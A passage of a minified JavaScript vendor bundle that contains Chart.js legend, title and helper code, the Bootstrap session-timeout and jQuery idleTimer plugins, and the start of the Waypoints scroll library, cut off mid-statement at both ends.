t.reverse(), e.legendItems = t }, afterBuildLabels: ni, beforeFit: ni, fit: function () { var i, o, a, s, r, g, l, c, t = this, e = t.options, I = e.labels, n = e.display, u = t.ctx, h = lt.options._parseFont(I), d = h.size, C = t.legendHitBoxes = [], A = t.minSize, p = t.isHorizontal(); p ? (A.width = t.maxWidth, A.height = n ? 10 : 0) : (A.width = n ? 10 : 0, A.height = t.maxHeight), n && (u.font = h.string, p ? (i = t.lineWidths = [0], o = 0, u.textAlign = "left", u.textBaseline = "top", lt.each(t.legendItems, function (t, e) { var n = oi(I, d) + d / 2 + u.measureText(t.text).width; (0 === e || i[i.length - 1] + n + I.padding > A.width) && (o += d + I.padding, i[i.length - (0 < e ? 0 : 1)] = I.padding), C[e] = { left: 0, top: 0, width: n, height: d }, i[i.length - 1] += n + I.padding }), A.height += o) : (a = I.padding, s = t.columnWidths = [], r = I.padding, l = g = 0, c = d + a, lt.each(t.legendItems, function (t, e) { var n = oi(I, d) + d / 2 + u.measureText(t.text).width; 0 < e && l + c > A.height - a && (r += g + I.padding, s.push(g), l = g = 0), g = Math.max(g, n), l += c, C[e] = { left: 0, top: 0, width: n, height: d } }), r += g, s.push(g), A.width += r)), t.width = A.width, t.height = A.height }, afterFit: ni, isHorizontal: function () { return "top" === this.options.position || "bottom" === this.options.position }, draw: function () { var m, t, e, f, b, B, y, v, x, F = this, Q = F.options, G = Q.labels, n = st.global, w = n.defaultColor, X = n.elements.line, S = F.width, k = F.lineWidths; Q.display && (m = F.ctx, t = ii(G.fontColor, n.defaultFontColor), e = lt.options._parseFont(G), f = e.size, m.textAlign = "left", m.textBaseline = "middle", m.lineWidth = .5, m.strokeStyle = t, m.fillStyle = t, m.font = e.string, b = oi(G, f), B = F.legendHitBoxes, y = F.isHorizontal(), v = y ? { x: F.left + (S - k[0]) / 2 + G.padding, y: F.top + G.padding, line: 0 } : { x: F.left + G.padding, y: F.top + G.padding, line: 0 }, x = f + G.padding, lt.each(F.legendItems, function (t, e) { var n, i, o, a, s, r, g, l, c, I, u, h, d = m.measureText(t.text).width, C = b + f / 2 + d, A = v.x, p = v.y; y ? 0 < e && A + C + G.padding > F.left + F.minSize.width && (p = v.y += x, v.line++, A = v.x = F.left + (S - k[v.line]) / 2 + G.padding) : 0 < e && p + x > F.top + F.minSize.height && (A = v.x = A + F.columnWidths[v.line] + G.padding, p = v.y = F.top + G.padding, v.line++), n = A, i = p, o = t, isNaN(b) || b <= 0 || (m.save(), a = ii(o.lineWidth, X.borderWidth), m.fillStyle = ii(o.fillStyle, w), m.lineCap = ii(o.lineCap, X.borderCapStyle), m.lineDashOffset = ii(o.lineDashOffset, X.borderDashOffset), m.lineJoin = ii(o.lineJoin, X.borderJoinStyle), m.lineWidth = a, m.strokeStyle = ii(o.strokeStyle, w), m.setLineDash && m.setLineDash(ii(o.lineDash, X.borderDash)), Q.labels && Q.labels.usePointStyle ? (s = b * Math.SQRT2 / 2, r = n + b / 2, g = i + f / 2, lt.canvas.drawPoint(m, o.pointStyle, s, r, g)) : (0 !== a && m.strokeRect(n, i, b, f), m.fillRect(n, i, b, f)), m.restore()), B[e].left = A, B[e].top = p, l = t, c = d, u = b + (I = f / 2) + A, h = p + I, m.fillText(l.text, u, h), l.hidden && (m.beginPath(), m.lineWidth = 2, m.moveTo(u, h), m.lineTo(u + c, h), m.stroke()), y ? v.x += C + G.padding : v.y += x })) }, _getLegendItemAt: function (t, e) { var n, i, o; if (t >= this.left && t <= this.right && e >= this.top && e <= this.bottom) for (o = this.legendHitBoxes, n = 0; n < o.length; ++n)if (t >= (i = o[n]).left && t <= i.left + i.width && e >= i.top && e <= i.top + i.height) return this.legendItems[n]; return null }, handleEvent: function (t) { var e, n = this.options, i = "mouseup" === t.type ? "click" : t.type; if ("mousemove" === i) { if (!n.onHover && !n.onLeave) return } else { if ("click" !== i) return; if (!n.onClick) return } e = this._getLegendItemAt(t.x, t.y), "click" === i ? e && n.onClick && n.onClick.call(this, t.native, e) : (n.onLeave && e !== this._hoveredItem && (this._hoveredItem && n.onLeave.call(this, t.native, this._hoveredItem), this._hoveredItem = e), n.onHover && e && n.onHover.call(this, t.native, e)) } }); function si(t, e) { var n = new ai({ ctx: t.ctx, options: e, chart: t }); me.configure(t, n, e), me.addBox(t, n), t.legend = n } var ri = { id: "legend", _element: ai, beforeInit: function (t) { var e = t.options.legend; e && si(t, e) }, beforeUpdate: function (t) { var e = t.options.legend, n = t.legend; e ? (lt.mergeIf(e, st.global.legend), n ? (me.configure(t, n, e), n.options = e) : si(t, e)) : n && (me.removeBox(t, n), delete t.legend) }, afterEvent: function (t, e) { var n = t.legend; n && n.handleEvent(e) } }, gi = lt.noop; st._set("global", { title: { display: !1, fontStyle: "bold", fullWidth: !0, padding: 10, position: "top", text: "", weight: 2e3 } }); var li = ht.extend({ initialize: function (t) { lt.extend(this, t), this.legendHitBoxes = [] }, beforeUpdate: gi, update: function (t, e, n) { var i = this; return i.beforeUpdate(), i.maxWidth = t, i.maxHeight = e, i.margins = n, i.beforeSetDimensions(), i.setDimensions(), i.afterSetDimensions(), i.beforeBuildLabels(), i.buildLabels(), i.afterBuildLabels(), i.beforeFit(), i.fit(), i.afterFit(), i.afterUpdate(), i.minSize }, afterUpdate: gi, beforeSetDimensions: gi, setDimensions: function () { var t = this; t.isHorizontal() ? (t.width = t.maxWidth, t.left = 0, t.right = t.width) : (t.height = t.maxHeight, t.top = 0, t.bottom = t.height), t.paddingLeft = 0, t.paddingTop = 0, t.paddingRight = 0, t.paddingBottom = 0, t.minSize = { width: 0, height: 0 } }, afterSetDimensions: gi, beforeBuildLabels: gi, buildLabels: gi, afterBuildLabels: gi, beforeFit: gi, fit: function () { var t = this.options, e = t.display, n = this.minSize, i = lt.isArray(t.text) ? t.text.length : 1, o = lt.options._parseFont(t), a = e ? i * o.lineHeight + 2 * t.padding : 0; this.isHorizontal() ? (n.width = this.maxWidth, n.height = a) : (n.width = a, n.height = this.maxHeight), this.width = n.width, this.height = n.height }, afterFit: gi, isHorizontal: function () { var t = this.options.position; return "top" === t || "bottom" === t }, draw: function () { var t = this.ctx, e = this.options; if (e.display) { var n, i, o, a = lt.options._parseFont(e), s = a.lineHeight, r = s / 2 + e.padding, g = 0, l = this.top, c = this.left, I = this.bottom, u = this.right; t.fillStyle = lt.valueOrDefault(e.fontColor, st.global.defaultFontColor), t.font = a.string, this.isHorizontal() ? (i = c + (u - c) / 2, o = l + r, n = u - c) : (i = "left" === e.position ? c + r : u - r, o = l + (I - l) / 2, n = I - l, g = Math.PI * ("left" === e.position ? -.5 : .5)), t.save(), t.translate(i, o), t.rotate(g), t.textAlign = "center", t.textBaseline = "middle"; var h = e.text; if (lt.isArray(h)) for (var d = 0, C = 0; C < h.length; ++C)t.fillText(h[C], 0, d, n), d += s; else t.fillText(h, 0, 0, n); t.restore() } } }); function ci(t, e) { var n = new li({ ctx: t.ctx, options: e, chart: t }); me.configure(t, n, e), me.addBox(t, n), t.titleBlock = n } var Ii = {}, ui = ei, hi = ri, di = { id: "title", _element: li, beforeInit: function (t) { var e = t.options.title; e && ci(t, e) }, beforeUpdate: function (t) { var e = t.options.title, n = t.titleBlock; e ? (lt.mergeIf(e, st.global.title), n ? (me.configure(t, n, e), n.options = e) : ci(t, e)) : n && (me.removeBox(t, n), delete t.titleBlock) } }; function Ci(t, e, n) { var i; return "string" == typeof t ? (i = parseInt(t, 10), -1 !== t.indexOf("%") && (i = i / 100 * e.parentNode[n])) : i = t, i } function Ai(t) { return null != t && "none" !== t } function pi(t, e, n) { var i = document.defaultView, o = lt._getParentNode(t), a = i.getComputedStyle(t)[e], s = i.getComputedStyle(o)[e], r = Ai(a), g = Ai(s), l = Number.POSITIVE_INFINITY; return r || g ? Math.min(r ? Ci(a, t, n) : l, g ? Ci(s, o, n) : l) : "none" } for (var mi in Ii.filler = ui, Ii.legend = hi, Ii.title = di, (en.helpers = lt).where = function (t, e) { if (lt.isArray(t) && Array.prototype.filter) return t.filter(e); var n = []; return lt.each(t, function (t) { e(t) && n.push(t) }), n }, lt.findIndex = Array.prototype.findIndex ? function (t, e, n) { return t.findIndex(e, n) } : function (t, e, n) { n = void 0 === n ? t : n; for (var i = 0, o = t.length; i < o; ++i)if (e.call(n, t[i], i, t)) return i; return -1 }, lt.findNextWhere = function (t, e, n) { lt.isNullOrUndef(n) && (n = -1); for (var i = n + 1; i < t.length; i++) { var o = t[i]; if (e(o)) return o } }, lt.findPreviousWhere = function (t, e, n) { lt.isNullOrUndef(n) && (n = t.length); for (var i = n - 1; 0 <= i; i--) { var o = t[i]; if (e(o)) return o } }, lt.isNumber = function (t) { return !isNaN(parseFloat(t)) && isFinite(t) }, lt.almostEquals = function (t, e, n) { return Math.abs(t - e) < n }, lt.almostWhole = function (t, e) { var n = Math.round(t); return n - e < t && t < n + e }, lt.max = function (t) { return t.reduce(function (t, e) { return isNaN(e) ? t : Math.max(t, e) }, Number.NEGATIVE_INFINITY) }, lt.min = function (t) { return t.reduce(function (t, e) { return isNaN(e) ? t : Math.min(t, e) }, Number.POSITIVE_INFINITY) }, lt.sign = Math.sign ? function (t) { return Math.sign(t) } : function (t) { return 0 === (t = +t) || isNaN(t) ? t : 0 < t ? 1 : -1 }, lt.log10 = Math.log10 ? function (t) { return Math.log10(t) } : function (t) { var e = Math.log(t) * Math.LOG10E, n = Math.round(e); return t === Math.pow(10, n) ? n : e }, lt.toRadians = function (t) { return t * (Math.PI / 180) }, lt.toDegrees = function (t) { return t * (180 / Math.PI) }, lt._decimalPlaces = function (t) { if (lt.isFinite(t)) { for (var e = 1, n = 0; Math.round(t * e) / e !== t;)e *= 10, n++; return n } }, lt.getAngleFromPoint = function (t, e) { var n = e.x - t.x, i = e.y - t.y, o = Math.sqrt(n * n + i * i), a = Math.atan2(i, n); return a < -.5 * Math.PI && (a += 2 * Math.PI), { angle: a, distance: o } }, lt.distanceBetweenPoints = function (t, e) { return Math.sqrt(Math.pow(e.x - t.x, 2) + Math.pow(e.y - t.y, 2)) }, lt.aliasPixel = function (t) { return t % 2 == 0 ? 0 : .5 }, lt._alignPixel = function (t, e, n) { var i = t.currentDevicePixelRatio, o = n / 2; return Math.round((e - o) * i) / i + o }, lt.splineCurve = function (t, e, n, i) { var o = t.skip ? e : t, a = e, s = n.skip ? e : n, r = Math.sqrt(Math.pow(a.x - o.x, 2) + Math.pow(a.y - o.y, 2)), g = Math.sqrt(Math.pow(s.x - a.x, 2) + Math.pow(s.y - a.y, 2)), l = r / (r + g), c = g / (r + g), I = i * (l = isNaN(l) ? 0 : l), u = i * (c = isNaN(c) ? 0 : c); return { previous: { x: a.x - I * (s.x - o.x), y: a.y - I * (s.y - o.y) }, next: { x: a.x + u * (s.x - o.x), y: a.y + u * (s.y - o.y) } } }, lt.EPSILON = Number.EPSILON || 1e-14, lt.splineCurveMonotone = function (t) { for (var e, n, i, o, a, s, r, g, l, c = (t || []).map(function (t) { return { model: t._model, deltaK: 0, mK: 0 } }), I = c.length, u = 0; u < I; ++u) { (e = c[u]).model.skip || (i = 0 < u ? c[u - 1] : null, (o = u < I - 1 ? c[u + 1] : null) && !o.model.skip && (n = o.model.x - e.model.x, e.deltaK = 0 != n ? (o.model.y - e.model.y) / n : 0), !i || i.model.skip ? e.mK = e.deltaK : !o || o.model.skip ? e.mK = i.deltaK : this.sign(i.deltaK) !== this.sign(e.deltaK) ? e.mK = 0 : e.mK = (i.deltaK + e.deltaK) / 2) } for (u = 0; u < I - 1; ++u)e = c[u], o = c[u + 1], e.model.skip || o.model.skip || (lt.almostEquals(e.deltaK, 0, this.EPSILON) ? e.mK = o.mK = 0 : (a = e.mK / e.deltaK, s = o.mK / e.deltaK, (g = Math.pow(a, 2) + Math.pow(s, 2)) <= 9 || (r = 3 / Math.sqrt(g), e.mK = a * r * e.deltaK, o.mK = s * r * e.deltaK))); for (u = 0; u < I; ++u)(e = c[u]).model.skip || (i = 0 < u ? c[u - 1] : null, o = u < I - 1 ? c[u + 1] : null, i && !i.model.skip && (l = (e.model.x - i.model.x) / 3, e.model.controlPointPreviousX = e.model.x - l, e.model.controlPointPreviousY = e.model.y - l * e.mK), o && !o.model.skip && (l = (o.model.x - e.model.x) / 3, e.model.controlPointNextX = e.model.x + l, e.model.controlPointNextY = e.model.y + l * e.mK)) }, lt.nextItem = function (t, e, n) { return n ? e >= t.length - 1 ? t[0] : t[e + 1] : e >= t.length - 1 ? t[t.length - 1] : t[e + 1] }, lt.previousItem = function (t, e, n) { return n ? e <= 0 ? t[t.length - 1] : t[e - 1] : e <= 0 ? t[0] : t[e - 1] }, lt.niceNum = function (t, e) { var n = Math.floor(lt.log10(t)), i = t / Math.pow(10, n), o = e ? i < 1.5 ? 1 : i < 3 ? 2 : i < 7 ? 5 : 10 : i <= 1 ? 1 : i <= 2 ? 2 : i <= 5 ? 5 : 10; return o * Math.pow(10, n) }, lt.requestAnimFrame = "undefined" == typeof window ? function (t) { t() } : window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame || function (t) { return window.setTimeout(t, 1e3 / 60) }, lt.getRelativePosition = function (t, e) { var n = t.originalEvent || t, i = t.target || t.srcElement, o = i.getBoundingClientRect(), a = n.touches, s = a && 0 < a.length ? (h = a[0].clientX, a[0].clientY) : (h = n.clientX, n.clientY), r = parseFloat(lt.getStyle(i, "padding-left")), g = parseFloat(lt.getStyle(i, "padding-top")), l = parseFloat(lt.getStyle(i, "padding-right")), c = parseFloat(lt.getStyle(i, "padding-bottom")), I = o.right - o.left - r - l, u = o.bottom - o.top - g - c, h = Math.round((h - o.left - r) / I * i.width / e.currentDevicePixelRatio); return { x: h, y: s = Math.round((s - o.top - g) / u * i.height / e.currentDevicePixelRatio) } }, lt.getConstraintWidth = function (t) { return pi(t, "max-width", "clientWidth") }, lt.getConstraintHeight = function (t) { return pi(t, "max-height", "clientHeight") }, lt._calculatePadding = function (t, e, n) { return -1 < (e = lt.getStyle(t, e)).indexOf("%") ? n * parseInt(e, 10) / 100 : parseInt(e, 10) }, lt._getParentNode = function (t) { var e = t.parentNode; return e && "[object ShadowRoot]" === e.toString() && (e = e.host), e }, lt.getMaximumWidth = function (t) { var e = lt._getParentNode(t); if (!e) return t.clientWidth; var n = e.clientWidth, i = n - lt._calculatePadding(e, "padding-left", n) - lt._calculatePadding(e, "padding-right", n), o = lt.getConstraintWidth(t); return isNaN(o) ? i : Math.min(i, o) }, lt.getMaximumHeight = function (t) { var e = lt._getParentNode(t); if (!e) return t.clientHeight; var n = e.clientHeight, i = n - lt._calculatePadding(e, "padding-top", n) - lt._calculatePadding(e, "padding-bottom", n), o = lt.getConstraintHeight(t); return isNaN(o) ? i : Math.min(i, o) }, lt.getStyle = function (t, e) { return t.currentStyle ? t.currentStyle[e] : document.defaultView.getComputedStyle(t, null).getPropertyValue(e) }, lt.retinaScale = function (t, e) { var n, i, o, a = t.currentDevicePixelRatio = e || "undefined" != typeof window && window.devicePixelRatio || 1; 1 !== a && (n = t.canvas, i = t.height, o = t.width, n.height = i * a, n.width = o * a, t.ctx.scale(a, a), n.style.height || n.style.width || (n.style.height = i + "px", n.style.width = o + "px")) }, lt.fontString = function (t, e, n) { return e + " " + t + "px " + n }, lt.longestText = function (e, t, n, i) { var o = (i = i || {}).data = i.data || {}, a = i.garbageCollect = i.garbageCollect || []; i.font !== t && (o = i.data = {}, a = i.garbageCollect = [], i.font = t), e.font = t; var s = 0; lt.each(n, function (t) { null != t && !0 !== lt.isArray(t) ? s = lt.measureText(e, o, a, s, t) : lt.isArray(t) && lt.each(t, function (t) { null == t || lt.isArray(t) || (s = lt.measureText(e, o, a, s, t)) }) }); var r = a.length / 2; if (r > n.length) { for (var g = 0; g < r; g++)delete o[a[g]]; a.splice(0, r) } return s }, lt.measureText = function (t, e, n, i, o) { var a = e[o]; return a || (a = e[o] = t.measureText(o).width, n.push(o)), i < a && (i = a), i }, lt.numberOfLabelLines = function (t) { var e = 1; return lt.each(t, function (t) { lt.isArray(t) && t.length > e && (e = t.length) }), e }, lt.color = M ? function (t) { return t instanceof CanvasGradient && (t = st.global.defaultColor), M(t) } : function (t) { return console.error("Color.js not found!"), t }, lt.getHoverColor = function (t) { return t instanceof CanvasPattern || t instanceof CanvasGradient ? t : lt.color(t).saturate(.5).darken(.1).rgbString() }, en._adapters = an, en.Animation = Ct, en.animationService = At, en.controllers = re, en.DatasetController = Bt, en.defaults = st, en.Element = ht, en.elements = Tt, en.Interaction = de, en.layouts = me, en.platform = He, en.plugins = Ee, en.Scale = In, en.scaleService = Re, en.Ticks = sn, en.Tooltip = Ke, en.helpers.each(Kn, function (t, e) { en.scaleService.registerScaleType(e, t, t._defaults) }), Ii) Ii.hasOwnProperty(mi) && en.plugins.register(Ii[mi]); en.platform.initialize(); var fi = en; return "undefined" != typeof window && (window.Chart = en), (en.Chart = en).Legend = Ii.legend._element, en.Title = Ii.title._element, en.pluginService = en.plugins, en.PluginBase = en.Element.extend({}), en.canvasHelpers = en.helpers.canvas, en.layoutService = en.layouts, en.LinearScaleBase = An, en.helpers.each(["Bar", "Bubble", "Doughnut", "Line", "PolarArea", "Radar", "Scatter"], function (n) { en[n] = function (t, e) { return new en(t, en.helpers.merge(e || {}, { type: n.charAt(0).toLowerCase() + n.slice(1) })) } }), fi }), function (I) { "use strict"; I.sessionTimeout = function (t) { function e() { clearTimeout(n), (g.countdownMessage || g.countdownBar) && s("session", !0), "function" == typeof g.onStart && g.onStart(g), g.keepAlive && (c || (I.ajax({ type: g.ajaxType, url: g.keepAliveUrl, data: g.ajaxData }), c = !0, setTimeout(function () { c = !1 }, g.keepAliveInterval))), n = setTimeout(function () { "function" != typeof g.onWarn ? I("#session-timeout-dialog").modal("show") : g.onWarn(g), clearTimeout(n), I("#session-timeout-dialog").hasClass("in") || !g.countdownMessage && !g.countdownBar || s("dialog", !0), n = setTimeout(function () { "function" != typeof g.onRedir ? window.location = g.redirUrl : g.onRedir(g) }, g.redirAfter - g.warnAfter) }, g.warnAfter) } function s(t, e) { clearTimeout(l.timer), "dialog" === t && e ? l.timeLeft = Math.floor((g.redirAfter - g.warnAfter) / 1e3) : "session" === t && e && (l.timeLeft = Math.floor(g.redirAfter / 1e3)), g.countdownBar && "dialog" === t ? l.percentLeft = Math.floor(l.timeLeft / ((g.redirAfter - g.warnAfter) / 1e3) * 100) : g.countdownBar && "session" === t && (l.percentLeft = Math.floor(l.timeLeft / (g.redirAfter / 1e3) * 100)); var n, i, o = I(".countdown-holder"), a = 0 <= l.timeLeft ? l.timeLeft : 0; g.countdownSmart ? (0 < (i = 0 < (n = Math.floor(a / 60)) ? n + "m" : "").length && (i += " "), i += a % 60 + "s", o.text(i)) : o.text(a + "s"), g.countdownBar && I(".countdown-bar").css("width", l.percentLeft + "%"), l.timeLeft = l.timeLeft - 1, l.timer = setTimeout(function () { s(t) }, 1e3) } var n, i, o, a, r = { title: "Your Session is About to Expire!", message: "Your session is about to expire.", logoutButton: "Logout", keepAliveButton: "Stay Connected", keepAliveUrl: "/keep-alive", ajaxType: "POST", ajaxData: "", redirUrl: "/timed-out", logoutUrl: "/log-out", warnAfter: 9e5, redirAfter: 12e5, keepAliveInterval: 5e3, keepAlive: !0, ignoreUserActivity: !1, onStart: !1, onWarn: !1, onRedir: !1, countdownMessage: !1, countdownBar: !1, countdownSmart: !1 }, g = r, l = {}; if (t && (g = I.extend(r, t)), g.warnAfter >= g.redirAfter) return console.error('Bootstrap-session-timeout plugin is miss-configured. Option "redirAfter" must be equal or greater than "warnAfter".'), !1; "function" != typeof g.onWarn && (i = g.countdownMessage ? "<p>" + g.countdownMessage.replace(/{timer}/g, '<span class="countdown-holder"></span>') + "</p>" : "", o = g.countdownBar ? '<div class="progress">                   <div class="progress-bar progress-bar-striped countdown-bar active" role="progressbar" style="min-width: 15px; width: 100%;">                     <span class="countdown-holder"></span>                   </div>                 </div>' : "", I("body").append('<div class="modal fade" id="session-timeout-dialog">               <div class="modal-dialog">                 <div class="modal-content">                   <div class="modal-header">                     <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>                     <h4 class="modal-title">' + g.title + '</h4>                   </div>                   <div class="modal-body">                     <p>' + g.message + "</p>                     " + i + "                     " + o + '                   </div>                   <div class="modal-footer">                     <button id="session-timeout-dialog-logout" type="button" class="btn btn-default">' + g.logoutButton + '</button>                     <button id="session-timeout-dialog-keepalive" type="button" class="btn btn-primary" data-dismiss="modal">' + g.keepAliveButton + "</button>                   </div>                 </div>               </div>              </div>"), I("#session-timeout-dialog-logout").on("click", function () { window.location = g.logoutUrl }), I("#session-timeout-dialog").on("hide.bs.modal", function () { e() })), g.ignoreUserActivity || (a = [-1, -1], I(document).on("keyup mouseup mousemove touchend touchmove", function (t) { if ("mousemove" === t.type) { if (t.clientX === a[0] && t.clientY === a[1]) return; a[0] = t.clientX, a[1] = t.clientY } e(), 0 < I("#session-timeout-dialog").length && I("#session-timeout-dialog").data("bs.modal") && I("#session-timeout-dialog").data("bs.modal").isShown && (I("#session-timeout-dialog").modal("hide"), I("body").removeClass("modal-open"), I("div.modal-backdrop").remove()) })); var c = !1; e() } }(jQuery), function (I) { I.idleTimer = function (t, i) { var e; "object" == typeof t ? (e = t, t = null) : "number" == typeof t && (e = { timeout: t }, t = null), i = i || document, e = I.extend({ idle: !1, timeout: 3e4, events: "mousemove keydown wheel DOMMouseScroll mousewheel mousedown touchstart touchmove MSPointerDown MSPointerMove" }, e); function n(t) { var e = I.data(i, "idleTimerObj") || {}; e.idle = !e.idle, e.olddate = +new Date; var n = I.Event((e.idle ? "idle" : "active") + ".idleTimer"); I(i).trigger(n, [i, I.extend({}, e), t]) } function o(t) { var e = I.data(i, "idleTimerObj") || {}; if (("storage" !== t.type || t.originalEvent.key === e.timerSyncId) && null == e.remaining) { if ("mousemove" === t.type) { if (t.pageX === e.pageX && t.pageY === e.pageY) return; if (void 0 === t.pageX && void 0 === t.pageY) return; if (new Date - e.olddate < 200) return } clearTimeout(e.tId), e.idle && n(t), e.lastActive = +new Date, e.pageX = t.pageX, e.pageY = t.pageY, "storage" !== t.type && e.timerSyncId && "undefined" != typeof localStorage && localStorage.setItem(e.timerSyncId, e.lastActive), e.tId = setTimeout(n, e.timeout) } } function a() { var t = I.data(i, "idleTimerObj") || {}; t.idle = t.idleBackup, t.olddate = +new Date, t.lastActive = t.olddate, t.remaining = null, clearTimeout(t.tId), t.idle || (t.tId = setTimeout(n, t.timeout)) } var s, r, g, l = I(i), c = l.data("idleTimerObj") || {}; if (null === t && void 0 !== c.idle) return a(), l; if (null !== t) { if (null !== t && void 0 === c.idle) return !1; if ("destroy" === t) return g = I.data(i, "idleTimerObj") || {}, clearTimeout(g.tId), l.removeData("idleTimerObj"), l.off("._idleTimer"), l; if ("pause" === t) return null == (r = I.data(i, "idleTimerObj") || {}).remaining && (r.remaining = r.timeout - (new Date - r.olddate), clearTimeout(r.tId)), l; if ("resume" === t) return null != (s = I.data(i, "idleTimerObj") || {}).remaining && (s.idle || (s.tId = setTimeout(n, s.remaining)), s.remaining = null), l; if ("reset" === t) return a(), l; if ("getRemainingTime" === t) return function () { var t = I.data(i, "idleTimerObj") || {}; if (t.idle) return 0; if (null != t.remaining) return t.remaining; var e = t.timeout - (new Date - t.lastActive); return e < 0 && (e = 0), e }(); if ("getElapsedTime" === t) return new Date - c.olddate; if ("getLastActiveTime" === t) return c.lastActive; if ("isIdle" === t) return c.idle } return l.on(I.trim((e.events + " ").split(" ").join("._idleTimer ")), function (t) { o(t) }), e.timerSyncId && I(window).bind("storage", o), (c = I.extend({}, { olddate: +new Date, lastActive: +new Date, idle: e.idle, idleBackup: e.idle, timeout: e.timeout, remaining: null, timerSyncId: e.timerSyncId, tId: null, pageX: null, pageY: null })).idle || (c.tId = setTimeout(n, c.timeout)), I.data(i, "idleTimerObj", c), l }, I.fn.idleTimer = function (t) { return this[0] ? I.idleTimer(t, this[0]) : this } }(jQuery), function () { "use strict"; var e = 0, a = {}; function n(t) { if (!t) throw new Error("No options passed to Waypoint constructor"); if (!t.element) throw new Error("No element option passed to Waypoint constructor"); if (!t.handler) throw new Error("No handler option passed to Waypoint constructor"); this.key = "waypoint-" + e, this.options = n.Adapter.extend({}, n.defaults, t), this.element = this.options.element, this.adapter = new n.Adapter(this.element), this.callback = t.handler, this.axis = this.options.horizontal ? "horizontal" : "vertical", this.enabled = this.options.enabled, this.triggerPoint = null, this.group = n.Group.findOrCreate({ name: this.options.group, axis: this.axis }), this.context = n.Context.findOrCreateByElement(this.options.context), n.offsetAliases[this.options.offset] && (this.options.offset = n.offsetAliases[this.options.offset]), this.group.add(this), this.context.add(this), a[this.key] = this, e += 1 } n.prototype.queueTrigger = function (t) { this.group.queueTrigger(this, t) }, n.prototype.trigger = function (t) { this.enabled && this.callback && this.callback.apply(this, t) }, n.prototype.destroy = function () { this.context.remove(this), this.group.remove(this), delete a[this.key] }, n.prototype.disable = function () { return this.enabled = !1, this }, n.prototype.enable = function () { return this.context.refresh(), this.enabled = !0, this }, n.prototype.next = function () { return this.group.next(this) }, n.prototype.previous = function () { return this.group.previous(this) }, n.invokeAll = function (t) { var e = []; for (var n in a) e.push(a[n]); for (var i = 0, o = e.length; i < o; i++)e[i][t]() }, n.destroyAll = function () { n.invokeAll("destroy") }, n.disableAll = function () { n.invokeAll("disable") }, n.enableAll = function () { for (var t in n.Context.refreshAll(), a) a[t].enabled = !0; return this }, n.refreshAll = function () { n.Context.refreshAll() }, n.viewportHeight = function () { return window.innerHeight || document.documentElement.clientHeight }, n.viewportWidth = function () { return document.documentElement.clientWidth }, n.adapters = [], n.defaults = { context: window, continuous: !0, enabled: !0, group: "default", horizontal: !1, offset: 0 }, n.offsetAliases = { "bottom-in-view": function () { return this.context.innerHeight() - this.adapter.outerHeight() }, "right-in-view": function () { return this.context.innerWidth() - this.adapter.outerWidth() } }, window.Waypoint = n }(), function () { "use strict"; function e(t) { window.setTimeout(t, 1e3 / 60) } var n = 0, i = {}, A = window.Waypoint, t = window.onload; function o(t) { this.element = t, this.Adapter = A.Adapter, this.adapter = new this.Adapter(t), this.key = "waypoint-context-" + n, this.didScroll = !1, this.didResize = !1, this.oldScroll = { x: this.adapter.scrollLeft(), y: this.adapter.scrollTop() }, this.waypoints = { vertical: {}, horizontal: {} }, t.waypointContextKey = this.key, i[t.waypointContextKey] = this, n += 1, A.windowContext || (A.windowContext = !0, A.windowContext = new o(window)), this.createThrottledScrollHandler(), this.createThrottledResizeHandler() } o.prototype.add = function (t) { var e = t.options.horizontal ? "horizontal" : "vertical"; this.waypoints[e][t.key] = t, this.refresh() }, o.prototype.checkEmpty = function () { var t = this.Adapter.isEmptyObject(this.waypoints.horizontal), e = this.Adapter.isEmptyObject(this.waypoints.vertical), n = this.element == this.element.window; t && e && !n && (this.adapter.off(".waypoints"), delete i[this.key]) }, o.prototype.createThrottledResizeHandler = function () { var t = this; function e() { t.handleResize(), t.didResize = !1 } this.adapter.on("resize.waypoints", function () { t.didResize || (t.didResize = !0, A.requestAnimationFrame(e)) }) }, o.prototype.createThrottledScrollHandler = function () { var t = this; function e() { t.handleScroll(), t.didScroll = !1 } this.adapter.on("scroll.waypoints", function () { t.didScroll && !A.isTouch || (t.didScroll = !0, A.requestAnimationFrame(e)) }) }, o.prototype.handleResize = function () { A.Context.refreshAll() }, o.prototype.handleScroll = function () { var t = {}, e = { horizontal: { newScroll: this.adapter.scrollLeft(), oldScroll: this.oldScroll.x, forward: "right", backward: "left" }, vertical: { newScroll: this.adapter.scrollTop(), oldScroll: this.oldScroll.y, forward: "down", backward: "up" } }; for (var n in e) { var i = e[n], o = i.newScroll > i.oldScroll ? i.forward : i.backward; for (var a in this.waypoints[n]) { var s, r, g = this.waypoints[n][a]; null !== g.triggerPoint && (s = i.oldScroll < g.triggerPoint, r = i.newScroll >= g.triggerPoint, (s && r || !s && !r) && (g.queueTrigger(o), t[g.group.id] = g.group)) } } for (var l in t) t[l].flushTriggers(); this.oldScroll = { x: e.horizontal.newScroll, y: e.vertical.newScroll } }, o.prototype.innerHeight = function () { return this.element == this.element.window ? A.viewportHeight() : this.adapter.innerHeight() }, o.prototype.remove = function (t) { delete this.waypoints[t.axis][t.key], this.checkEmpty() }, o.prototype.innerWidth = function () { return this.element == this.element.window ? A.viewportWidth() : this.adapter.innerWidth() }, o.prototype.destroy = function () { var t = []; for (var e in this.waypoints) for (var n in this.waypoints[e]) t.push(this.waypoints[e][n]); for (var i = 0, o = t.length; i < o; i++)t[i].destroy() }, o.prototype.refresh = function () { var t, e = this.element == this.element.window, n = e ? void 0 : this.adapter.offset(), i = {}; for (var o in this.handleScroll(), t = { horizontal: { contextOffset: e ? 0 : n.left, contextScroll: e ? 0 : this.oldScroll.x, contextDimension: this.innerWidth(), oldScroll: this.oldScroll.x, forward: "right", backward: "left", offsetProp: "left" }, vertical: { contextOffset: e ? 0 : n.top, contextScroll: e ? 0 : this.oldScroll.y, contextDimension: this.innerHeight(), oldScroll: this.oldScroll.y, forward: "down", backward: "up", offsetProp: "top" } }) { var a = t[o]; for (var s in this.waypoints[o]) { var r, g, l, c, I = this.waypoints[o][s], u = I.options.offset, h = I.triggerPoint, d = 0, C = null == h; I.element !== I.element.window && (d = I.adapter.offset()[a.offsetProp]), "function" == typeof u ? u = u.apply(I) : "string" == typeof u && (u = parseFloat(u), -1 < I.options.offset.indexOf("%") && (u = Math.ceil(a.contextDimension * u / 100))), r = a.contextScroll - a.contextOffset, I.triggerPoint = Math.floor(d + r - u), g = h < a.oldScroll, l = I.triggerPoint >= a.oldScroll, c = !g && !l, !C && (g && l) ? 